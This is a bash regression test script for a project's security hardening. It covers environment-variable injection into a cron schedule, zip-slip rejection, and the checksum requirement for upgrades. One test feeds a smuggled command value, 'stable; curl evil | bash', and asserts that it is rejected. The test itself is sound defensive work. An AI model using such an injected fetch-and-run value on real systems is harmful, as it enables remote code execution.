#!/usr/bin/env bash
# Behavioral / unit regression tests for security hardening.
set -uo pipefail

TEST_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${TEST_DIR}/../.." && pwd)"

# shellcheck source=../lib/assertions.sh
source "${TEST_DIR}/../lib/assertions.sh"
# shellcheck source=../lib/mocks.sh
source "${TEST_DIR}/../lib/mocks.sh"

setup_mock_bin
trap teardown_mock_bin EXIT

echo -e "${YELLOW}=== Behavioral tests: security hardening ===${NC}"

GO_BIN="${REPO_ROOT}/bin/millennium"
if [[ ! -x "$GO_BIN" ]]; then
  make -C "$REPO_ROOT" build
fi

# --- Schedule enable ignores env-poisoned channel (Go reads config) ---
SCHEDULE_SH="${REPO_ROOT}/scripts/millennium-schedule.sh"
FAKE_HOME=$(mktemp -d)
export XDG_CONFIG_HOME="${FAKE_HOME}/.config"
mkdir -p "${XDG_CONFIG_HOME}/millennium-helpers"
printf '%s\n' '{"update_channel":"stable"}' > "${XDG_CONFIG_HOME}/millennium-helpers/config.json"

out=$(CONFIG_UPDATE_CHANNEL='stable; curl evil | bash' bash "$SCHEDULE_SH" enable --dry-run --cron 2>&1)
rc=$?
assert_success "$rc" "schedule enable ignores poisoned CONFIG_UPDATE_CHANNEL env"
assert_contains "$out" "--channel stable" "cron dry-run embeds validated channel from config"
assert_not_contains "$out" "curl evil" "cron dry-run does not embed attacker payload from env"

out=$(bash "$SCHEDULE_SH" enable beta --dry-run --cron 2>&1)
rc=$?
assert_success "$rc" "schedule enable beta --dry-run --cron exits 0"
assert_contains "$out" "--channel beta" "cron dry-run embeds validated channel"
assert_not_contains "$out" "curl evil" "cron dry-run does not embed attacker payload"

# --- Zip-slip covered by Go archive package ---
(
  cd "${REPO_ROOT}/go" || exit 1
  CGO_ENABLED=0 go test ./internal/archive/ -count=1
)
assert_success $? "go test ./internal/archive covers zip-slip rejection"

# --- upgrade --file without checksum fails (Go thin-wrap) ---
UPGRADE_SH="${REPO_ROOT}/scripts/millennium-upgrade.sh"
MOCK_FILE=$(mktemp)
echo data > "$MOCK_FILE"
out=$(bash "$UPGRADE_SH" --file "$MOCK_FILE" 2>&1)
rc=$?
assert_failure "$rc" "upgrade --file without checksum fails closed"
assert_contains "$out" "sha256" "upgrade --file without checksum mentions checksum requirement"
rm -f "$MOCK_FILE"
rm -rf "$FAKE_HOME"

echo -e "${YELLOW}--- test_security.sh summary: ${ASSERT_RUN:-?} run, ${ASSERT_FAIL:-?} failed ---${NC}"
